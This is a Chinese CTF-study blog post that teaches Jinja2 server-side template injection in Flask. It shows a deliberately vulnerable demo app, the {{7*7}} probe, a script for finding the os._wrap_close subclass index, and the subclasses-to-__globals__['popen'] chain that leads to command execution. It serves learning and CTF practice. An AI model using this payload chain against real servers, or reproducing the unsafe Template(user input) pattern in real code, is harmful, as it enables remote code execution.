@@ -1,0 +1,437 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 7.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon.ico">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon.ico">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+  <meta name="google-site-verification" content="google-site-verification=1l-Ncv0xIlzPx6dkZdorprb8MU59sYp-f3JtihJKCaM">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.7.2/css/all.min.css" integrity="sha256-dABdfBfUoC8vJUBOwGVdm8L9qlMWaHTIfXt+7GnZCIo=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/themes/silver/pace-theme-minimal.css">
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/pace.min.js" integrity="sha256-gqd7YTjg/BtfqWSwsJOvndl0Bxc8gFImLEkXQT8+qj0=" crossorigin="anonymous"></script>
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"example.com","root":"/","images":"/images","scheme":"Gemini","darkmode":true,"version":"8.22.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"copycode":{"enable":true,"show_result":true,"style":null},"fold":{"enable":false,"height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js"></script>
+
+
+    <meta name="description" content="by小林 https:&#x2F;&#x2F;xz.aliyun.com&#x2F;news&#x2F;3311#toc-1 https:&#x2F;&#x2F;xz.aliyun.com&#x2F;t&#x2F;9584#toc-32 https:&#x2F;&#x2F;chenlvtang.top&#x2F;2021&#x2F;03&#x2F;31&#x2F;SSTI%E8%BF%9B%E9%98%B6&#x2F; 我常用的payload 123456789101112131415161718192021222324from flask i">
+<meta property="og:type" content="article">
+<meta property="og:title" content="傻子都能看懂的SSTI入门">
+<meta property="og:url" content="http://example.com/2025/04/30/%E5%82%BB%E5%AD%90%E9%83%BD%E8%83%BD%E7%9C%8B%E6%87%82%E7%9A%84SSTI%E5%85%A5%E9%97%A8/index.html">
+<meta property="og:site_name" content="CTF学习笔记">
+<meta property="og:description" content="by小林 https:&#x2F;&#x2F;xz.aliyun.com&#x2F;news&#x2F;3311#toc-1 https:&#x2F;&#x2F;xz.aliyun.com&#x2F;t&#x2F;9584#toc-32 https:&#x2F;&#x2F;chenlvtang.top&#x2F;2021&#x2F;03&#x2F;31&#x2F;SSTI%E8%BF%9B%E9%98%B6&#x2F; 我常用的payload 123456789101112131415161718192021222324from flask i">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2025/png/35213294/1745763176430-7a0e4919-8fae-4e91-8c30-2b71e034296d.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2025/png/35213294/1745763245034-f8626bda-1767-4759-99f3-fa7ff011ca2a.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2025/png/35213294/1745763383376-241875ea-bdf5-46e6-bd47-ecc8ba9433aa.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2025/png/35213294/1745763451500-085ca8ef-e78b-43e2-a454-e8c43873764f.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2025/png/35213294/1745763437399-f63d5f90-e1fb-434c-85c0-924abbb92d75.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2025/png/35213294/1745763550631-515f15d4-f612-4bb2-b0f1-fd8369f880a6.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2025/png/35213294/1745763910985-43fc7afd-f971-4560-8e90-3e8b4341aca9.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2025/png/35213294/1745764008834-e6740d59-2400-4d7a-9b64-209921c36c32.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2025/png/35213294/1745764069176-392b9ca3-2f57-4c69-a268-1e96d70818f5.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2025/png/35213294/1745764103186-9d3f293c-7ab1-40c1-9750-cb6941a867ee.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2025/png/35213294/1745764153701-1d413b54-aed7-4f7f-9560-40584c5aca5a.png">
+<meta property="article:published_time" content="2025-04-30T09:40:23.000Z">
+<meta property="article:modified_time" content="2025-05-04T17:09:37.930Z">
+<meta property="article:author" content="温柔刀">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.nlark.com/yuque/0/2025/png/35213294/1745763176430-7a0e4919-8fae-4e91-8c30-2b71e034296d.png">
+
+
+<link rel="canonical" href="http://example.com/2025/04/30/%E5%82%BB%E5%AD%90%E9%83%BD%E8%83%BD%E7%9C%8B%E6%87%82%E7%9A%84SSTI%E5%85%A5%E9%97%A8/">
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"http://example.com/2025/04/30/%E5%82%BB%E5%AD%90%E9%83%BD%E8%83%BD%E7%9C%8B%E6%87%82%E7%9A%84SSTI%E5%85%A5%E9%97%A8/","path":"2025/04/30/傻子都能看懂的SSTI入门/","title":"傻子都能看懂的SSTI入门"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>傻子都能看懂的SSTI入门 | CTF学习笔记</title>
+  
+
+
+
+
+
+
+
+<link rel="dns-prefetch" href="comment-three-tau.vercel.app">
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">CTF学习笔记</p>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li><li class="menu-item menu-item-schedule"><a href="/schedule/" rel="section"><i class="fa fa-calendar fa-fw"></i>日程表</a></li><li class="menu-item menu-item-commonweal"><a href="/404/" rel="section"><i class="fa fa-heartbeat fa-fw"></i>公益 404</a></li>
+  </ul>
+</nav>
+
+
+
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+
+
+    <div class="sidebar-inner sidebar-overview-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="温柔刀"
+      src="/images/avatar_2.gif">
+  <p class="site-author-name" itemprop="name">温柔刀</p>
+  <div class="site-description" itemprop="description">JNU_WEB</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">82</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">11</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">54</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/Gent1eknife" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;Gent1eknife" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+  </div>
+
+        </div>
+      </div>
+    </div>
+
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2025/04/30/%E5%82%BB%E5%AD%90%E9%83%BD%E8%83%BD%E7%9C%8B%E6%87%82%E7%9A%84SSTI%E5%85%A5%E9%97%A8/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar_2.gif">
+      <meta itemprop="name" content="温柔刀">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="CTF学习笔记">
+      <meta itemprop="description" content="JNU_WEB">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="傻子都能看懂的SSTI入门 | CTF学习笔记">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          傻子都能看懂的SSTI入门
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2025-04-30 17:40:23" itemprop="dateCreated datePublished" datetime="2025-04-30T17:40:23+08:00">2025-04-30</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2025-05-05 01:09:37" itemprop="dateModified" datetime="2025-05-05T01:09:37+08:00">2025-05-05</time>
+    </span>
+
+  
+  
+  <span class="post-meta-item">
+    
+    <span class="post-meta-item-icon">
+      <i class="far fa-comment"></i>
+    </span>
+    <span class="post-meta-item-text">Waline：</span>
+  
+    <a title="waline" href="/2025/04/30/%E5%82%BB%E5%AD%90%E9%83%BD%E8%83%BD%E7%9C%8B%E6%87%82%E7%9A%84SSTI%E5%85%A5%E9%97%A8/#waline" itemprop="discussionUrl">
+      <span class="post-comments-count waline-comment-count" data-path="/2025/04/30/%E5%82%BB%E5%AD%90%E9%83%BD%E8%83%BD%E7%9C%8B%E6%87%82%E7%9A%84SSTI%E5%85%A5%E9%97%A8/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+    <span class="post-meta-break"></span>
+    <span class="post-meta-item" title="本文字数">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-word"></i>
+      </span>
+      <span class="post-meta-item-text">本文字数：</span>
+      <span>735</span>
+    </span>
+    <span class="post-meta-item" title="阅读时长">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">阅读时长 &asymp;</span>
+      <span>3 分钟</span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><p>by小林</p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/3311#toc-1">https://xz.aliyun.com/news/3311#toc-1</a></p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/9584#toc-32">https://xz.aliyun.com/t/9584#toc-32</a></p>
+<p><a target="_blank" rel="noopener" href="https://chenlvtang.top/2021/03/31/SSTI%E8%BF%9B%E9%98%B6/">https://chenlvtang.top/2021/03/31/SSTI%E8%BF%9B%E9%98%B6/</a></p>
+<p>我常用的payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">from flask import Flask,request</span><br><span class="line">from jinja2 import Template</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">@app.route(&quot;/&quot;)</span><br><span class="line">def index():</span><br><span class="line">    name = request.args.get(&#x27;name&#x27;,&#x27;CTFer&lt;!--?name=CTFer&#x27;)</span><br><span class="line"></span><br><span class="line">    t = Template(&quot;hello &quot; + name)</span><br><span class="line">    return t.render()</span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    app.run(host=&quot;0.0.0.0&quot;,port=10008)</span><br><span class="line"></span><br><span class="line">#/?name=&#123;&#123;7*7&#125;&#125; 会发现页面返回了49，代表着存在反模板渲染</span><br><span class="line">#这里的渲染等同于在python中运算了print(7*7)</span><br><span class="line">#&#123;&#123;&#125;&#125;中的操作会被打印出来</span><br><span class="line"># 一般会用&#123;%%&#125;来替代，但是&#123;%%&#125;不会有回显,在没有数据时会报错</span><br><span class="line"># 可以用&#123;%print(7*7)%&#125;来进行输出</span><br><span class="line"># 你可以理解为，模板注入就是会对你传入的&#123;&#123;&#125;&#125;中的 “python代码” 进行执行 ，或者说是 解析你输入的表达式</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#/?name=</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">/?name=&#123;&#123;7*7&#125;&#125; 会发现页面返回了49，代表着存在反模板渲染</span><br><span class="line"></span><br><span class="line">这里的渲染等同于在python中运算了print(7*7)</span><br><span class="line"></span><br><span class="line">&#123;&#123;&#125;&#125;中的操作会被打印出来</span><br><span class="line"></span><br><span class="line">一般会用`&#123;%%&#125;`来替代，但是`&#123;%%&#125;`不会有回显,在没有数据时会报错</span><br><span class="line"></span><br><span class="line">可以用&#123;%print(7*7)%&#125;来进行输出</span><br><span class="line"></span><br><span class="line">你可以理解为，模板注入就是会对你传入的&#123;&#123;&#125;&#125;中的 “python代码” 进行执行 ，或者说是 解析你输入的表达式</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<p>我们可以发现网络上大部分的payload都会利用”” ‘’ [] 来作为开头，我们来看看他在做什么</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/35213294/1745763176430-7a0e4919-8fae-4e91-8c30-2b71e034296d.png"></p>
+<p>其实””，’’,[]，都是一个对象，我们可以通过一些魔术函数来获取他们的类原型</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/35213294/1745763245034-f8626bda-1767-4759-99f3-fa7ff011ca2a.png"></p>
+<p>例如这里，我们就获取了字符串的类原型，我们的目的是获取基类Object，至于为什么需要获取他后需在说</p>
+<p>我们可以利用一些魔术方法</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">__base__ //返回类的父类</span><br><span class="line"></span><br><span class="line">__mro__//获取继承类的数组</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/35213294/1745763383376-241875ea-bdf5-46e6-bd47-ecc8ba9433aa.png"></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/35213294/1745763451500-085ca8ef-e78b-43e2-a454-e8c43873764f.png"></p>
+<p>使用任意一个即可</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/35213294/1745763437399-f63d5f90-e1fb-434c-85c0-924abbb92d75.png"></p>
+<p>好的我们获取到基类了，接下来我们可以列出来所有的类,使用一个魔术函数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print(&quot;&quot;.__class__.__base__.__subclasses__())</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/35213294/1745763550631-515f15d4-f612-4bb2-b0f1-fd8369f880a6.png"></p>
+<p>其中有一个类叫做 os._wrap_close，我们要去看看他其中的方法，这里返回的是一个数组，所以需要知道这个属性的下标是什么</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">classes=<span class="string">&quot;&quot;&quot; </span></span><br><span class="line"><span class="string">#把列表放在这</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">num=<span class="number">0</span></span><br><span class="line">alllist=[]</span><br><span class="line">result=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> classes:</span><br><span class="line">    <span class="keyword">if</span> i==<span class="string">&quot;&gt;&quot;</span>:</span><br><span class="line">        result+=i</span><br><span class="line">        alllist.append(result)</span><br><span class="line">        result=<span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> i==<span class="string">&quot;\n&quot;</span> <span class="keyword">or</span> i==<span class="string">&quot;,&quot;</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        result+=i</span><br><span class="line"><span class="comment">#寻找要找的类，并返回其索引</span></span><br><span class="line"><span class="keyword">for</span> k,v <span class="keyword">in</span> <span class="built_in">enumerate</span>(alllist):</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;&lt;class &#x27;os._wrap_close&#x27;&gt;&quot;</span> <span class="keyword">in</span> v:</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">str</span>(k)+<span class="string">&quot;---&gt;&quot;</span>+v)</span><br><span class="line"><span class="comment"># &lt;class &#x27;os._wrap_close&#x27;&gt; 执行命令</span></span><br><span class="line"><span class="comment"># &lt;class &#x27;warnings.catch_warnings&#x27;&gt;  执行命令</span></span><br><span class="line"><span class="comment"># &lt;class &#x27;_frozen_importlib.BuiltinImporter&#x27;&gt; 读取文件</span></span><br><span class="line"><span class="comment"># &lt;class &#x27;_frozen_importlib_external.FileLoader&#x27;&gt; 读取文件</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/35213294/1745763910985-43fc7afd-f971-4560-8e90-3e8b4341aca9.png"></p>
+<p>在154,那么我们选用这个类，利用魔术函数__init__进行初始化，使用__globals__去获取他的变量属性及函数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print(&quot;&quot;.__class__.__base__.__subclasses__()[154].__init__.__globals__)</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/35213294/1745764008834-e6740d59-2400-4d7a-9b64-209921c36c32.png"></p>
+<p>popen是一个可以执行命令的函数 system.popen，他这里是一个元组的类型，我们选用该函数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print(&quot;&quot;.__class__.__base__.__subclasses__()[154].__init__.__globals__[&quot;popen&quot;])</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/35213294/1745764069176-392b9ca3-2f57-4c69-a268-1e96d70818f5.png"></p>
+<p>然后我们使用该函数</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/35213294/1745764103186-9d3f293c-7ab1-40c1-9750-cb6941a867ee.png"></p>
+<p>如果需要读取回显，在后面加一个read</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/35213294/1745764153701-1d413b54-aed7-4f7f-9560-40584c5aca5a.png"></p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+
+        
+  <div class="social-like a2a_kit a2a_kit_size_32 a2a_default_style">
+    <a class="a2a_dd" target="_blank" rel="noopener" href="https://www.addtoany.com/share"></a>
+      <a class="a2a_button_facebook"></a>
+      <a class="a2a_button_twitter"></a>
+  </div>
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2025/04/29/%E7%BA%A2%E9%98%9F%E7%AC%94%E8%AE%B0/" rel="prev" title="红队笔记">
+                  <i class="fa fa-angle-left"></i> 红队笔记
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2025/05/01/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%B5%81%E7%A8%8B/" rel="next" title="渗透测试流程">
+                  渗透测试流程 <i class="fa fa-angle-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+    <div class="comments" id="waline"></div>
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2025</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">温柔刀</span>
+  </div>
+<div class="wordcount">
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-line"></i>
+    </span>
+      <span>站点总字数：</span>
+    <span title="站点总字数">63k</span>
+  </span>
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+      <span>站点阅读时长 &asymp;</span>
+    <span title="站点阅读时长">3:50</span>
+  </span>
+</div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/sidebar.js"></script><script src="/js/next-boot.js"></script>
+
+  
+
+
+
+
+  <script src="/js/third-party/pace.js"></script>
+
+  <script src="/js/third-party/addtoany.js"></script>
+
+  
+
+
+
+
+<script class="next-config" data-name="waline" type="application/json">{"lang":"zh-cn","enable":true,"serverURL":"comment-three-tau.vercel.app","cssUrl":"https://unpkg.com/@waline/client@v2/dist/waline.css","commentCount":true,"pageview":false,"placeholder":"说两句吧~","avatar":"mm","meta":["nick","mail","link"],"pageSize":10,"visitor":true,"comment_count":true,"requiredFields":["nick","mail"],"libUrl":"//unpkg.com/@waline/client@v2/dist/waline.js","el":"#waline","comment":true,"path":"/2025/04/30/%E5%82%BB%E5%AD%90%E9%83%BD%E8%83%BD%E7%9C%8B%E6%87%82%E7%9A%84SSTI%E5%85%A5%E9%97%A8/"}</script>
+<link rel="stylesheet" href="https://unpkg.com/@waline/client@v2/dist/waline.css">
+<script>
+document.addEventListener('page:loaded', () => {
+  NexT.utils.loadComments(CONFIG.waline.el).then(() =>
+    NexT.utils.getScript(CONFIG.waline.libUrl, { condition: window.Waline })
+  ).then(() => 
+    Waline.init(Object.assign({}, CONFIG.waline,{ el: document.querySelector(CONFIG.waline.el) }))
+  );
+});
+</script>
+
+</body>
+</html>
+
+<!-- 页面点击小红心 -->
+<script type="text/javascript" src="/js/src/clicklove.js"></script>
